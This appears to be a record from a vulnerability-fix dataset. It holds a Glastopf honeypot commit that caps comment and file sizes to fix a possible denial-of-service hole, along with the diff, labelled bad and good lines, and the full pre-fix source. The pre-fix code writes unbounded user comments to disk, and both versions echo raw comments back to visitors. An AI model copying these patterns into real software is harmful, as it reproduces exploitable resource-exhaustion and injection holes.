  ip_address = attack_event.source_addr[0]\n        with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n            try:\n                comment = (parse_qs(attack_event.parsed_request.body)\n                           ['comment'][0])\n                clean_comment = self.html_escape(comment)\n                clean_comment = \"<br\/><br\/>\" + clean_comment\n                comment = \"<br\/><br\/>\" + comment\n            except KeyError:\n                comment = \"\"\n                clean_comment = \"\"\n            else:\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n                    comments_txt.write(clean_comment)\n                profiler.Profiler.add_comment(ip_address, comment)\n            comments_file = os.path.join(self.data_dir, 'comments.txt')\n            if os.path.isfile(comments_file):\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n                    general_comments = comments_txt.read()\n            else:\n                general_comments = ''\n\n            ip_comments = profiler.Profiler.get_comments(ip_address)\n            display_comments = str(ip_comments) + str(general_comments)\n            template = Template(dork_page.read())\n            attack_event.response = template.safe_substitute(\n                login_msg=\"\",\n                comments=display_comments)\n"}},"msg":"Improved comments handler to fix possible Denial of Service vulnerability"}},"https:\/\/github.com\/Jorggio\/Glastopf":{"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34":{"url":"https:\/\/api.github.com\/repos\/Jorggio\/Glastopf\/commits\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","html_url":"https:\/\/github.com\/Jorggio\/Glastopf\/commit\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","message":"Improved comments handler to fix possible Denial of Service vulnerability","sha":"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","keyword":"denial of service improve","diff":"diff --git a\/glastopf\/modules\/handlers\/emulators\/comments.py b\/glastopf\/modules\/handlers\/emulators\/comments.py\nindex db7ed6b..bac1b99 100644\n--- a\/glastopf\/modules\/handlers\/emulators\/comments.py\n+++ b\/glastopf\/modules\/handlers\/emulators\/comments.py\n@@ -10,6 +10,9 @@\n \n \n class CommentPoster(base_emulator.BaseEmulator):\n+    MAX_COMMENT_LEN = 2048\n+    MAX_FILE_LEN = 33816700  # ~ 3MB\n+\n     def __init__(self, data_dir):\n         super(CommentPoster, self).__init__(data_dir)\n \n@@ -24,6 +27,9 @@ def handle(self, attack_event):\n             dork_page_list.remove('.git')\n         dork_page = choice(dork_page_list)\n         ip_address = attack_event.source_addr[0]\n+\n+        comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n         with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n             try:\n                 comment = (parse_qs(attack_event.parsed_request.body)\n@@ -35,12 +41,21 @@ def handle(self, attack_event):\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","files":{"\/glastopf\/modules\/handlers\/emulators\/comments.py":{"changes":[{"diff":"\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","add":14,"remove":5,"filename":"\/glastopf\/modules\/handlers\/emulators\/comments.py","badparts":["                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:","                    comments_txt.write(clean_comment)","                profiler.Profiler.add_comment(ip_address, comment)","            comments_file = os.path.join(self.data_dir, 'comments.txt')","                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:"],"goodparts":["                if os.path.isfile(comments_file):","                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:","                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:","                            comments_txt.write('')","                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:","                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:","                        comments_txt.write(clean_comment)","                    profiler.Profiler.add_comment(ip_address, comment)","                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:"]}],"source":"\nimport os from random import choice import codecs from urlparse import parse_qs from string import Template import cgi from glastopf.modules.handlers import base_emulator import glastopf.modules.processing.profiler as profiler class CommentPoster(base_emulator.BaseEmulator): def __init__(self, data_dir): super(CommentPoster, self).__init__(data_dir) def html_escape(self, comment): return cgi.escape(comment) def handle(self, attack_event): pages_path=os.path.join(self.data_dir, 'dork_pages') dork_page_list=os.listdir(pages_path) if '.git' in dork_page_list: dork_page_list.remove('.git') dork_page=choice(dork_page_list) ip_address=attack_event.source_addr[0] with codecs.open(os.path.join(pages_path, dork_page)) as dork_page: try: comment=(parse_qs(attack_event.parsed_request.body) ['comment'][0]) clean_comment=self.html_escape(comment) clean_comment=\"<br\/><br\/>\" +clean_comment comment=\"<br\/><br\/>\" +comment except KeyError: comment=\"\" clean_comment=\"\" else: with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt: comments_txt.write(clean_comment) profiler.Profiler.add_comment(ip_address, comment) comments_file=os.path.join(self.data_dir, 'comments.txt') if os.path.isfile(comments_file): with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt: general_comments=comments_txt.read() else: general_comments='' ip_comments=profiler.Profiler.get_comments(ip_address) display_comments=str(ip_comments) +str(general_comments) template=Template(dork_page.read()) attack_event.response=template.safe_substitute( login_msg=\"\", comments=display_comments) ","sourceWithComments":"import os\nfrom random import choice\nimport codecs\nfrom urlparse import parse_qs\nfrom string import Template\nimport cgi\nfrom glastopf.modules.handlers import base_emulator\n\nimport glastopf.modules.processing.profiler as profiler\n\n\nclass CommentPoster(base_emulator.BaseEmulator):\n    def __init__(self, data_dir):\n        super(CommentPoster, self).__init__(data_dir)\n\n    def html_escape(self, comment):\n        return cgi.escape(comment)\n\n    def handle(self, attack_event):\n        # TODO: Use the unknown emulators _get_template function.\n        pages_path = os.path.join(self.data_dir, 'dork_pages')\n        dork_page_list = os.listdir(pages_path)\n        if '.git' in dork_page_list:\n            dork_page_list.remove('.git')\n        dork_page = choice(dork_page_list)\n        ip_address = attack_event.source_addr[0]\n        with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n            try:\n                comment = (parse_qs(attack_event.parsed_request.body)\n                           ['comment'][0])\n                clean_comment = self.html_escape(comment)\n                clean_comment = \"<br\/><br\/>\" + clean_comment\n                comment = \"<br\/><br\/>\" + comment\n            except KeyError:\n                comment = \"\"\n                clean_comment = \"\"\n            else:\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n                    comments_txt.write(clean_comment)\n                profiler.Profiler.add_comment(ip_address, comment)\n            comments_file = os.path.join(self.data_dir, 'comments.txt')\n            if os.path.isfile(comments_file):\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n                    general_comments = comments_txt.read()\n            else:\n                general_comments = ''\n\n            ip_comments = profiler.Profiler.get_comments(ip_address)\n            display_comments = str(ip_comments) + str(general_comments)\n            template = Template(dork_page.read())\n            attack_event.response = template.safe_substitute(\n                login_msg=\"\",\n                comments=display_comments)\n"}},"msg":"Improved comments handler to fix possible Denial of Service vulnerability"}}}